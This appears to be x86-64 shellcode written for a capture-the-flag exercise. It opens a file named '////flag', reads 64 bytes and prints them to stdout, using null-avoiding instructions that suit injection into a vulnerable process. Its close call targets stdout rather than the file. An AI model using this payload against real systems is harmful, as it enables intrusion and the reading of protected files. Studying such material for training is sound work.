
.intel_syntax noprefix
.global _start

_start: 
	# syscall: open(path, flag, mode)
	# rax=2, rdi=path, rsi=flag, rdx=mode

	xor rax, rax
	mov al, 2
	xor rsi, rsi
	push rsi
		
	mov rbx, 0x67616C662F2F2F2F
	push rbx
	mov rdi, rsp
	xor rdx, rdx
	syscall
	
	# syscall: read(fd, buf, count)
	# rax=0, rdi=fd, rsi=buf, rdx=count

	xchg rdi, rax    # rdi=fd ; rax=rdi ; exchange the values
	xor rax, rax     # rax=0
	sub rsp, 0x40
	mov rsi, rsp	#rsi=Points to the start of the buf 
	push 0x40
	pop rdx	        #mov rdx, [rsp]   ; or   ; mov rdx, 50
	syscall

	# syscall: write(fd, buf, count)
	# rax=1, rdi=fd, rsi=buf, rdx=count
	mov al, 1
	xor rdi, rdi
	mov dil, 1
	syscall

	# syscall: close(fd)
	# rax=3, rdi=fd
	
	
	xor rax, rax
	mov al, 3
	syscall

	
	# syscall: exit()
	# rax=60
	xor rax, rax
	mov al, 60
	syscall



